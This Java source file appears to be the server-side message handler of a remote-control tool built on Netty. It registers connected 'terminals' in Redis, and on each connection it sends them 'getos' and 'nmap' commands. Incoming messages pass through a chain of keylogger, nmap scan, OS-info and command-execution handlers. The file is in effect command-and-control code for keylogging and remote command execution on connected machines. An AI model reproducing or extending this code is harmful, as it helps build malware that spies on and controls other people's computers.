package netty.Handler;

import Config.Config;
import RequestHandler.*;
import com.google.gson.Gson;
import io.netty.channel.ChannelHandler;
import io.netty.channel.ChannelHandlerContext;
import io.netty.channel.ChannelId;
import io.netty.channel.SimpleChannelInboundHandler;
import io.netty.channel.group.ChannelGroup;
import javabean.SocketInfo;
import netty.initTerminal.TerminalInit;
import redis.RedisUtil;

import java.security.Key;

/**
 * Created by jackdong on 2019-10-28
 * 实现对客户端的链接，使用group进行分组
 */
@ChannelHandler.Sharable
public class MesgHandler extends SimpleChannelInboundHandler<String> {

    private RedisUtil redisUtil;
    private static ChannelGroup channelGroup;
    private ChannelId SingleId;
    private TerminalInit terminalInit;
    private Gson gson;
    private MyRequestHanlder myRequestHanlder;


    public MesgHandler(ChannelGroup channelGroup) {
        this.channelGroup = channelGroup;
        redisUtil = new RedisUtil();
        SingleId = null;
        gson = new Gson();


    }

    @Override
    protected void channelRead0(ChannelHandlerContext ctx, String msg) throws Exception {
        System.out.println(msg);
        SocketInfo socketInfo = null;
        try {
            socketInfo = gson.fromJson(msg, SocketInfo.class);
        } catch (Exception e) {
            System.out.println(e);
        }
        if (socketInfo != null) {
            KeyLoggerHandler keyLoggerHandler = new KeyLoggerHandler();
            NmapHandler nmapHandler = new NmapHandler();
            OsInfoHandler osInfoHandler = new OsInfoHandler();
            CmdHandler cmdHandler = new CmdHandler();
            keyLoggerHandler.successor = nmapHandler;
            nmapHandler.successor = osInfoHandler;
            osInfoHandler.successor = cmdHandler;
            keyLoggerHandler.handlerRequest(socketInfo, ctx);
        }
    }


    @Override
    public void handlerAdded(ChannelHandlerContext ctx) throws Exception {
        if (!channelGroup.contains(ctx.channel())) {
            channelGroup.add(ctx.channel());
            SingleId = ctx.channel().id();
            System.out.println("new socket added");
            redisUtil.addTerminalChannelIDinfo(ctx.channel().id().toString());
            System.out.println(ctx.channel().id().toString());
        } else {
            System.out.println("not joined new socket added");
        }
        //terminalInit.initTerminals(ctx.channel());
        ctx.channel().writeAndFlush("getos");
        ctx.channel().writeAndFlush("nmap");

    }

    @Override
    public void channelInactive(ChannelHandlerContext ctx) throws Exception {
        System.out.println("channelInactive");
        redisUtil.DelTerminalChannelIDinfo(ctx.channel().id().toString());

    }

    public ChannelId getSingleId() {
        return SingleId;
    }

    public ChannelGroup getChannelGroup() {
        return channelGroup;
    }
}
